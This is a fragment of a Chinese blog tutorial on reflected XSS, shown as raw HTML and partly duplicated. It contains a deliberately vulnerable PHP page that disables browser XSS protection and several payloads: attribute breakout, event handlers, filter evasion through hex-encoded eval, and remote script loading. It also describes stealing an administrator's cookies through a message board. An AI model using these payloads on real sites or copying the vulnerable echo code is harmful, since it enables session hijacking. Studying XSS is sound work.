class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class=\"line\">  &lt;title&gt;XSS原理重现&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class=\"line\">  &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</span><br><span class=\"line\">  &lt;input type=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;hr&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">  header(&quot;X-XSS-Protection: 0&quot;); // 0： 表示关闭浏览器的XSS防护机制</span><br><span class=\"line\">  error_reporting(0); // 加上error_reporting(0);就不会弹出警告了</span><br><span class=\"line\">  $xss = $_GET[&apos;xss_input&apos;];</span><br><span class=\"line\">  echo &apos;&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;&apos;.$xss;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>现在在输入框中输入<code>abc</code>普通字符串，然后在页面中显示：</p>\n<p><img src=\"/view/posts/12cd2a8e/loading.gif\" alt=\"loading\"></p>\n<p>之后查看页面代码，就会发现页面上多了一行代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>XSS原理重现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    /*------多了的代码：123-------*/</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h5</span>&gt;</span>你输入的字符为<span class=\"tag\">&lt;/<span class=\"name\">h5</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此时，我要是在输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>这种可以被解析的代码时：</p>\n<p>现在页面就显现出xss漏洞了。</p>\n<p><img src=\"/view/posts/12cd2a8e/loadinga.gif\" alt=\"loadinga\"></p>\n<p>之后查看页面代码，就会发现页面上多了一行代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Content-Type\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>XSS原理重现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">/*------多了的代码：<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">'xss'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>-------*/</span><br><span class=\"line\">// 代码出现在 br标签 和 body标签中</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h5</span>&gt;</span>你输入的字符为<span class=\"tag\">&lt;/<span class=\"name\">h5</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">'xss'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xss利用输出环境来构造代码\"><a href=\"#xss利用输出环境来构造代码\" class=\"headerlink\" title=\"xss利用输出环境来构造代码\"></a>xss利用输出环境来构造代码</h2><p>现在我要改变 <strong>xss</strong> 攻击：</p>\n<p>以上测试是在，标签中插入<code>scrpit</code>标签达到攻击的目的；现在我想要在<code>html页面标签</code>的属性中插入<strong>xss</strong>攻击代码。因此，当你我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，不会显示出弹框了。</p>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class=\"line\">  &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;center&gt;</span><br><span class=\"line\">    &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</span><br><span class=\"line\">    &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class=\"line\">      &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</span><br><span class=\"line\">      &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">      &lt;input type=&quot;submit&quot;&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\">      header(&quot;X-XSS-Protection: 0&quot;);</span><br><span class=\"line\">      error_reporting(0);//加上error_reporting(0);就不会弹出警告了  </span><br><span class=\"line\">      $xss = $_GET[&apos;xss_input_value&apos;];</span><br><span class=\"line\">      if(isset($xss))&#123;</span><br><span class=\"line\">      echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;</span><br><span class=\"line\">      &#125;else&#123;</span><br><span class=\"line\">      echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\">  &lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>页面效果：</p>\n<p><img src=\"/view/posts/12cd2a8e/1562307165857.png\" alt=\"1562307165857\"></p>\n<h3 id=\"输入一\"><a href=\"#输入一\" class=\"headerlink\" title=\"输入一\"></a>输入一</h3><p>当我在输入框输入<code>qwer</code>字符串时，会在输出框显示我输入的字符串：</p>\n<p><img src=\"/view/posts/12cd2a8e/loadinga-1562307323724.gif\" alt=\"loadinga\"></p>\n<p>此时网页代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"qwer\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"输入二\"><a href=\"#输入二\" class=\"headerlink\" title=\"输入二\"></a>输入二</h3><p>现在我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，字符串正常输入，明显的可以看到，并没有弹出对话框：</p>\n<p><img src=\"/view/posts/12cd2a8e/111.gif\" alt=\"111\"></p>\n<p>此时网页代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"&lt;script&gt;alert('xss')&lt;/script&gt;\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分析输出代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"&lt;script&gt;alert('xss')&lt;/script&gt;\"</span>&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"输入三\"><a href=\"#输入三\" class=\"headerlink\" title=\"输入三\"></a>输入三</h3><p>如果我输入<code>&quot;&gt;</code>，就会变成：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span>&gt;</span> \"&gt;  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>input提前闭合了！之后的<code>&quot;&gt;</code>就被舍弃了，变成了普通文本。</p>\n<h3 id=\"输入四\"><a href=\"#输入四\" class=\"headerlink\" title=\"输入四\"></a>输入四</h3><p>如果我输入：<code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>\n<p>显示效果：</p>\n<p><img src=\"/view/posts/12cd2a8e/asc.gif\" alt=\"asc\"></p>\n<h3 id=\"输入五\"><a href=\"#输入五\" class=\"headerlink\" title=\"输入五\"></a>输入五</h3><p>现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\" onmousemove=\"alert('我就测试一下')\"</span><br></pre></td></tr></table></figure>\n<p>显示结果：</p>\n<p><img src=\"/view/posts/12cd2a8e/asc-1562308830171.gif\" alt=\"asc\"></p>\n<p>页面代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>把我们输入的字符串 输出到input里的value属性里<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"get\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span>请输入你想显现的字符串<span class=\"tag\">&lt;/<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"xss_input_value\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"输入\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmousemove</span>=<span class=\"string\">\"alert('我就测试一下')\"</span>\"&gt;</span>  <span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>说明：输入以后，鼠标在移动是触发事件，形成xss攻击。</strong></p>\n<p>那么，我在<textarea> 标签中显示呢？</textarea></p>\n<p>此时就这样输入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(‘xss’)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> // 就可以实现弹窗了</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤的解决办法\"><a href=\"#过滤的解决办法\" class=\"headerlink\" title=\"过滤的解决办法\"></a>过滤的解决办法</h2><p>假如说网站禁止过滤了script 这时该怎么办呢 ？</p>\n<p>那么就需要记住：<strong>只要页面能触发你的js代码</strong></p>\n<p>有哪些方法呢？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 当找不到图片名为1的文件时，执行alert('xss') --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">scr</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 点击s时运行alert('xss') --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">javascrip:alert(</span>'<span class=\"attr\">xss</span>')&gt;</span>s<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 利用iframe的scr来弹窗 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">javascript:alert(</span>'<span class=\"attr\">xss</span>');<span class=\"attr\">height</span>=<span class=\"string\">0</span> <span class=\"attr\">width</span>=<span class=\"string\">0</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">&lt;!-- 过滤了alert来执行弹窗 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">eval(</span>\"\\<span class=\"attr\">x61</span>\\<span class=\"attr\">x6c</span>\\<span class=\"attr\">x65</span>\\<span class=\"attr\">x72</span>\\<span class=\"attr\">x74</span>\\<span class=\"attr\">x28</span>\\<span class=\"attr\">x27</span>\\<span class=\"attr\">x78</span>\\<span class=\"attr\">x73</span>\\<span class=\"attr\">x73</span>\\<span class=\"attr\">x27</span>\\<span class=\"attr\">x29</span>\")&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">img</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xss的利用\"><a href=\"#xss的利用\" class=\"headerlink\" title=\"xss的利用\"></a>xss的利用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">scr</span>=<span class=\"string\">\"js_url\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">x</span> <span class=\"attr\">onerror</span>=<span class=\"string\">appendChild(createElement(</span>'<span class=\"attr\">script</span>'))<span class=\"attr\">.src</span>=<span class=\"string\">'js_url'</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>比如我们在网站的留言区输入<code>&lt;script scr=”js_url”&gt;&lt;/script&gt;</code></strong></p>\n<p><strong>当管理员进后台浏览留言的时候，就会触发</strong></p>\n<p><strong>然后管理员的cookies和后台地址还有管理员浏览器版本等等</strong></p>\n<p><strong>你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，</strong></p>\n<p><strong>就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"XXS攻击\"><a href=\"#XXS攻击\" class=\"headerlink\" title=\"XXS攻击\"></a>XXS攻击</h1><p>参看：</p>\n<p><a href=\"https://www.freebuf.com/articles/web/40520.html\" target=\"_blank\" rel=\"noopener\">XSS的原理分析与解剖</a></p>\n<p><a href=\"https://www.cnblogs.com/hellojesson/p/6386002.html\" target=\"_blank\" rel=\"noopener\">前端安全 – XSS攻击</a></p>\n<p><a href=\"https://blog.csdn.net/a401461843/article/details/77622299/\" target=\"_blank\" rel=\"noopener\">web大前端开发中一些常见的安全性问题</a></p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><strong>XSS</strong> 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。</p>\n<p><strong>XSS</strong> 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。</p>\n<h2 id=\"原理实现\"><a href=\"#原理实现\" class=\"headerlink\" title=\"原理实现\"></a>原理实现</h2><p>在本地搭建PHP环境（使用phpstudy安装），然后在<code>index.php</code>文件中输入一下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class=\"line\">  &lt;title&gt;XSS原理重现&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class=\"line\">  &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</span><br><span class=\"line\">  &lt;input type=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;hr&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">  header(&quot;X-XSS-Protection: 0&quot;); // 0： 表示关闭浏览器的XSS防护机制</span><br><span class=\"line\">  error_reporting(0); // 加上error_reporting(0);就不会弹出警告了</span><br><span class=\"line\">  $xss = $_GET[&apos;xss_input&apos;];</span><br><span class=\"line\">  echo &apos;&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;&apos;.$xss;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>现在在输入框中输入<code>abc</code>普通字符串，然后在页面中显示：</p>\n<p><img src=\"/view/posts/12cd2a8e/loading.gif\" alt=\"loading\"></p>\n<p>之后查看页面代码，就会发现页面上多了一行代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 